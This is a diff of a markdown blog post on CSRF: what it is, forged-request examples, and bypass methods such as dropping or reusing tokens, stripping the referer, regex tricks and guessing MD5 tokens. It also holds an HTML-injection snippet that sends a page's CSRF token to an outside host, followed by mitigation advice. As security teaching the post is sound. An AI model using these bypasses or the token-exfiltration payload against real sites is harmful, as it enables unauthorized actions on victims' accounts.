@@ -1,9 +1,24 @@
-### What is csrf:-
+---
+layout: post
+title:  "CSRF Attacks - How to Find, Exploit and fix them"
+author: imran
+categories: [ cybersecurity,csrf,web-attacks ]
+image: assets/images/26.png
+---
+
+
+
+### What is csrf
+
 Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. 
-### CSRF flaw and its exploitation:-
-CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf (though note that this is not true of login CSRF, a special form of the attack let me describe it ). For most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, Windows domain credentials, and so forth. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim. CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something. Forcing the victim to retrieve data doesn’t benefit an attacker because the attacker doesn’t receive the response, the victim does. As such, CSRF attacks target state-changing requests. An attacker can use CSRF to obtain the victim’s private data via a special form of the attack, known as login CSRF. The attacker forces a non-authenticated user to log in to an account the attacker controls. If the victim does not realize this, they may add personal data such as credit card information to the account. The attacker can then log back into the account to view this data, along with the victim’s activity history on the web application. t’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called stored CSRF flaws. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the impact is increased
-because the victim is more likely to view the page containing the attack than some random page on the Internet. The impact is also increased because the victim is sure to be authenticated to the site already. CSRF attacks are also known by a number of other names, including XSRF, “Sea Surf”, Session Riding, Cross-Site Reference Forgery, and Hostile Linking. Microsoft refers to this type of attack as a One-Click attack in their threat modeling process and many places in their online documentation.
-#### CSRF Example:
+
+### CSRF flaw and its exploitation
+
+CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf (though note that this is not true of login CSRF, a special form of the attack let me describe it ). For most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, Windows domain credentials, and so forth. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim. CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something. 
+
+
+### CSRF Attack Example:
+
 Before executing an assault, a perpetrator typically studies an application in order to make a forged request appear as legitimate as possible. 
 For example, a typical GET request for a $100 bank transfer might look like:
 ```
@@ -30,8 +45,10 @@ Next the attacker can distribute the hyperlink via email to a large number of ba
  </body>
  ```
 
-###  Bypasses for CSRF attack:
-#### Change the request method:
+##  Bypasses for CSRF attack:
+
+#### Change the request method
+
 Another thing worth trying is changing the request method of the request. If the sensitive request that you would like to forge is sent via the POST method, try converting the request to a GET request. And if the action is done via a GET, try converting it into a POST. The application might still execute the action and the same protection mechanism is often not in place.
 For example, this request:
 ```
@@ -43,64 +60,88 @@ Can be rewritten as:
 ```
 GET /change_password?new_password=qwerty
 ```
-### CSRF Protection via Tokens:
+#### CSRF Protection via Tokens
 
 Just because a site is using CSRF tokens does not mean that it is validating them properly. Here are a few things that you can try to bypass CSRF protection via tokens.
-#### Delete the token param or send a blank token:
+
+#### Delete the token param or send a blank token
+
 Not sending a token works fairly often because of this common application logic mistake: applications sometimes only check the validity of the token if the token exists, or if the token parameter is not blank. In this case, sending a request without the token, or a blank value as the token may be all you need to bypass the protection.
 For example, if a legitimate request looks like this:
-```
+
+```http
 POST /change_password
 POST body:
 new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
 ```
+
 Try this:
-```
+
+```http
 POST /change_password
 POST body:
 new_password=qwerty
 ```
+
 Or, this:
-```
+
+```http
 POST /change_password
 POST body:
 new_password=qwerty &csrf_tok=
 ```
-#### Use another session’s CSRF token:
+
+
+#### Use another session’s CSRF token
+
 The application might only be checking if the token is _valid_ or not, and not checking if it _belongs to the current user_. If that’s the case, you can simply hard code your own CSRF token into the payload. Let’s say the victim’s token is _871caef0757a4ac9691aceb9aad8b65b_, and yours is YOUR_TOKEN. You can obtain your own CSRF token easily but not the victim’s token. Try to bypass the CSRF protection by providing your own token in the place of the legitimate token.
 In other words, instead of sending this:
-```
+
+```http
 POST /change_password
 POST body:
 new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
 ```
+
+
 Send this:
 ```
 POST /change_password
 POST body:
 new_password=qwerty &csrf_tok=YOUR_TOKEN
 ```
-### CSRF Protection via Referer:
+
+
+## Referer Based CSRF Checks
 Let’s say that _attacker.com_ is a domain that you own. And _bank.com_ is the site that you are attacking. The site is not using CSRF tokens but is checking the referer header instead. What can you do now?
-#### Remove the referer header:
-Similar to sending a blank token, sometimes all you need to do to bypass a referer check is to simply not send a referer. To do this, you can add the following meta tag to the page hosting your payload:
+
+- Sending a blank tokens is one of the first things that you should do, sometimes all you need to do to bypass a referer check is to simply not send a referer. To do this, you can add the following meta tag to the page hosting your payload:
 ```
 <meta name=”referrer” content=”no-referrer”>
 ```
 The application might only be validating the referer if one is sent, in that case, you’ve successfully bypassed its CSRF protection!
-#### Bypass the regex:
+
+
+
+
+#### Bypass the regex
 If the referer check is based on a whitelist, you can try bypassing the regex used to validate the URL. For example, you can try placing victim domain name in referer URL as a subdomain or as a directory:
 If the site is looking for “_bank.com”_ in the referer URL, maybe “_bank.com.attacker.com”_ or “_attacker.com/bank.com”_ will work.
-### Extracting token via HTML injection:
+
+
+#### Extracting token via HTML injection
+
 This technique utilizes HTML injection vulnerability using which an attacker can plant a logger to extract the CSRF token from that web page and use that token. An attacker can plant a link such as
 ```
 <form action=”http://shahmeeramir.com/acquire_token.php”></textarea>
 ```
-### Decoding CSRF tokens:
+#### Decoding CSRF tokens:
+
 Another method to bypass CSRF is to identify the algorithm of the CSRF token. In my experience CSRF tokens are either MD5 or Base64 encoded values. You can decode that value and encode the next one in that algorithm and use that token. For instance “a0a080f42e6f13b3a2df133f073095dd” is MD5(122). You can similarly encrypt the next value MD5(123) to for CSRF token bypass.
 
 
-### Mitigation of CSRF attack:-
+### Mitigation of CSRF attack
+
 A number of effective methods exist for both prevention and mitigation of CSRF attacks. From a user’s perspective, prevention is a matter of safeguarding login credentials and denying unauthorised actors access to applications. The most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token should be:
 -   Unpredictable with high entropy, as for session tokens in general.
 -   Tied to the user's session.
